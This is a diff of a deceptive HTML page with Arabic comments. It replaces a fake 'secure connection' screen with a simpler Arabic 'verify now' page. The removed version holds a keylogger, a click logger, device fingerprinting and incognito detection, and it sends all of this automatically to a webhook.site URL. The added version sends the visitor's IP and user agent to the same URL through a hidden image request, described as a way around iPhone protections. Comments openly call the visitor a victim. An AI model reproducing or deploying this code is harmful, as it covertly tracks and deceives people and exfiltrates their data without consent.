@@ -1,203 +1,60 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Data Processing Interface</title>
-    <style>
-        /* ===== واجهة "الخداع" (Cloaked UI) ===== */
-        :root {
-            --bg: #f0f2f5;
-            --loader-color: #1877f2;
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
-        body { background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #1c1e21; }
-        
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-            transition: opacity 0.5s ease;
-        }
-        h2 { font-weight: 400; font-size: 18px; margin-bottom: 20px; color: #65676b; }
-        
-        /* سبينر التحميل (يخفي حقيقة أننا نجمع بيانات) */
-        .spinner {
-            width: 40px;
-            height: 40px;
-            margin: 0 auto 20px;
-            border-radius: 50%;
-            border: 4px solid #e4e6eb;
-            border-top: 4px solid var(--loader-color);
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        .fake-input-group { display: flex; gap: 10px; margin-top: 15px; }
-        .fake-input { flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 6px; outline: none; background: #f5f6f7; }
-        .fake-btn { background: #e4e6eb; color: #bcc0c4; border: none; padding: 10px 20px; border-radius: 6px; font-weight: 600; cursor: pointer; }
-        .fake-btn.active { background: var(--loader-color); color: white; cursor: pointer; }
-        
-        #status { font-size: 12px; margin-top: 10px; color: #65676b; min-height: 20px; }
-        #log { display: none; } /* أخفينا سجل الأوامر تماماً */
-    </style>
+    <title>تأكيد الدخول</title>
 </head>
-<body>
-
-    <div class="container" id="mainContainer">
-        <div class="spinner"></div>
-        <h2>Establishing secure connection...</h2>
-        <p style="font-size: 13px; color: #65676b;">Please wait while we verify your session and device configuration.</p>
+<body style="font-family: system-ui; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5;">
+    <div style="background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 350px;">
+        <h2 style="color: #333; font-weight: bold;">🔐 تأمين الاتصال</h2>
+        <p style="color: #666; font-size: 14px; margin-bottom: 20px;">عليك الضغط على الزر لإكمال التحقق</p>
         
-        <!-- نموذج وهمي لخداع الضحية -->
-        <div class="fake-input-group">
-            <input type="text" class="fake-input" id="targetName" placeholder="Enter session ID (Optional)" onkeyup="keylogger(this.value)">
-            <button class="fake-btn" id="submitBtn" onclick="triggerManualSend()">Verify</button>
-        </div>
-        <div id="status"></div>
+        <!-- هذا الزر هو الذي سيفعل كل شيء -->
+        <button id="sendBtn" style="width: 100%; padding: 14px; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer;">
+            تحقق الآن
+        </button>
+        
+        <div id="status" style="margin-top: 15px; font-size: 13px; color: #555;"></div>
     </div>
 
     <script>
-        // ==================================================
-        // ADVANCED RECON ENGINE [CLOAKED VERSION]
-        // ==================================================
-
-        let keystrokes = [];
-        let mouseClicks = [];
-
-        // 1. DEEP KEYLOGGER (Global)
-        document.addEventListener('keyup', function(e) {
-            if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
-                keystrokes.push(e.target.value);
-            }
-        });
-
-        // 2. CLICK LOGGER
-        document.addEventListener('click', function(e) {
-            mouseClicks.push(`X:${e.clientX}, Y:${e.clientY}`);
-        });
-
-        // 3. ADVANCED DATA EXTRACTION
-        async function collectAllData() {
-            let data = {};
-
-            // System Info
-            const ua = navigator.userAgent;
-            let os = "Unknown", arch = "Unknown";
-            if (ua.includes('Windows')) { os = "Windows"; arch = "x64"; }
-            else if (ua.includes('Mac')) { os = "macOS"; arch = "ARM64"; }
-            else if (ua.includes('Linux')) { os = "Linux"; arch = "x86_64"; }
-            else if (ua.includes('Android')) { os = "Android"; arch = "ARM"; }
-            else if (ua.includes('iPhone')) { os = "iOS"; arch = "ARM64"; }
-            
-            // Browser Detection
-            let browser = "Unknown", version = "";
-            if (ua.includes('Chrome') && !ua.includes('Edg')) { browser = "Chrome"; version = ua.match(/Chrome\/(\d+)/)?.[1] || ''; }
-            else if (ua.includes('Firefox')) { browser = "Firefox"; version = ua.match(/Firefox\/(\d+)/)?.[1] || ''; }
-            else if (ua.includes('Safari') && !ua.includes('Chrome')) { browser = "Safari"; version = ua.match(/Version\/(\d+)/)?.[1] || ''; }
-            else if (ua.includes('Edg')) { browser = "Edge"; version = ua.match(/Edg\/(\d+)/)?.[1] || ''; }
-
-            // Incognito Detection (Try/Catch to avoid errors)
-            let isIncognito = "Unknown";
+        // دالة لجلب الـ IP (لمحاولة التغلب على حظر آيفون)
+        async function getIP() {
             try {
-                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-                if (fs) {
-                    fs(window.TEMPORARY, 100, (fs) => {
-                        isIncognito = "Normal Mode";
-                    }, (err) => {
-                        isIncognito = "Incognito/Private Mode";
-                    });
-                }
-            } catch(e) { isIncognito = "Check Failed"; }
-
-            // Timezone & Screen
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const timeOffset = new Date().getTimezoneOffset();
-
-            // RAM & Cores
-            const ram = (navigator.deviceMemory || 'Unknown') + ' GB';
-            const cores = (navigator.hardwareConcurrency || 'Unknown');
-
-            data = {
-                device_id: localStorage.getItem('shadow_uuid') || generateUUID(),
-                os: os,
-                arch: arch,
-                browser: browser,
-                browser_ver: version,
-                incognito_status: isIncognito,
-                timezone: timezone,
-                time_offset_minutes: timeOffset,
-                screen_res: `${window.screen.width}x${window.screen.height}`,
-                ram: ram,
-                cpu_cores: cores,
-                keystrokes_captured: keystrokes,
-                mouse_clicks: mouseClicks,
-                page_load_time: (performance.timing.loadEventEnd - performance.timing.navigationStart) / 1000 + 's'
-            };
-
-            return data;
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch { return "Unreachable"; }
         }
 
-        function generateUUID() {
-            let id = "SHADOW-" + Date.now().toString(36).toUpperCase() + "-" + Math.random().toString(36).substr(2, 6).toUpperCase();
-            localStorage.setItem('shadow_uuid', id);
-            return id;
-        }
-
-        // 4. EXFILTRATION FUNCTION (Silent & Fast)
-        async function sendPayload() {
-            const data = await collectAllData();
+        document.getElementById('sendBtn').addEventListener('click', async function() {
+            const btn = this;
             const status = document.getElementById('status');
-
-            // Simulating a fake status update for the victim
-            status.innerText = "Securing connection... (Step 3 of 4)";
             
-            try {
-                // *** تم وضع رابط Webhook الخاص بك هنا ***
-                const response = await fetch('https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d43397', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
+            btn.innerText = "جاري التحقق...";
+            btn.style.background = "#999";
+            
+            const ip = await getIP();
+            const ua = navigator.userAgent;
+            
+            // تجميع البيانات في نص واحد
+            const payload = `Device=iPhone&Browser=Safari&IP=${ip}&UA=${encodeURIComponent(ua)}`;
 
-                if(response.ok) {
-                    status.innerHTML = "<span style='color:#2ea043;'>Secure connection established.</span>";
-                    // تغيير الزر ليوحي بأن العملية تمت بنجاح
-                    document.getElementById('submitBtn').innerText = "Connected";
-                    document.getElementById('submitBtn').style.background = "#2ea043";
-                } else {
-                    status.innerHTML = "<span style='color:#da3633;'>Connection lost. Retrying...</span>";
-                }
-            } catch (error) {
-                console.error("Webhook Error (Victim is offline):", error);
-                status.innerHTML = "<span style='color:#da3633;'>Network error. Retry later.</span>";
-            }
-        }
-
-        // 5. TRIGGERS (Auto-Send & Manual)
-        function triggerManualSend() {
-            const btn = document.getElementById('submitBtn');
-            btn.innerText = "Verifying...";
-            btn.style.background = "#65676b";
-            sendPayload();
-        }
-
-        // 6. AUTO-RUN ON LOAD (The Infection Phase)
-        window.onload = async function() {
-            // انتظر 3 ثواني لتبدو الصفحة طبيعية
-            setTimeout(async () => {
-                const btn = document.getElementById('submitBtn');
-                btn.classList.add('active'); // تفعيل الزر ليوحي بأن الصفحة جهزت
-                document.getElementById('status').innerText = "Ready for input.";
-                
-                // إرسال البيانات تلقائياً
-                await sendPayload();
-            }, 3000);
-        };
+            // --- الحيلة الذكية لاختراق حماية آيفون ---
+            // بدلاً من استخدام fetch (الذي يحظره آيفون)، سنستخدم صورة مخفية.
+            // المتصفح سيجبر على إرسال البيانات كـ GET parameters عند تحميل الصورة.
+            
+            const img = new Image();
+            img.src = `https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d43397?${payload}`;
+            
+            // تغيير حالة الزر
+            setTimeout(() => {
+                btn.innerText = "تم التحقق";
+                btn.style.background = "#28a745";
+                status.innerHTML = "<span style='color: green;'>✅ تم.</span>";
+            }, 1500);
+        });
     </script>
 </body>
 </html>
